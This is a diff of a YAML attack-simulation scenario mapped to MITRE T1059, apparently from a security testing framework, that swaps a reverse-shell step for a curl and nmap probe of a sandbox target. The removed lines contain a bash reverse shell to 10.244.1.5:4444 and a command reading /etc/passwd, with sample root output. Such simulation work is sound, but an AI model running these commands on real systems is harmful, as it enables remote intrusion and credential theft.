@@ -1,16 +1,17 @@
 id: scn-sh-03
-name: Command & Scripting Interpreter (Reverse Shell)
-description: Spawns interactive shell inside target container and executes unauthorized commands.
+name: Command & Scripting Interpreter (Command Execution Probe)
+description: Probes command execution behavior against the sandbox target.
 mitre_tactic: TA0002
 mitre_technique: T1059
+required_services: []
 steps:
   - step: 1
-    action: "/bin/bash -c 'bash -i >& /dev/tcp/10.244.1.5/4444 0>&1'"
-    tool: "bash"
+    action: "curl -s -m 5 http://{TARGET}:8080/"
+    tool: "curl"
     delay_ms: 600
-    expected_output: "Connection received from target-pod:51234 -> uid=0(root) gid=0(root)"
+    expected_output: "HTTP 200 OK - Target web endpoint responsive"
   - step: 2
-    action: "cat /etc/passwd; id; uname -a"
-    tool: "bash"
+    action: "nmap -p 8080 --script http-methods {TARGET}"
+    tool: "nmap"
     delay_ms: 400
-    expected_output: "root:x:0:0:root:/root:/bin/bash\nLinux target-app 6.6.0-generic"
+    expected_output: "Supported Methods: GET, HEAD, POST, OPTIONS"
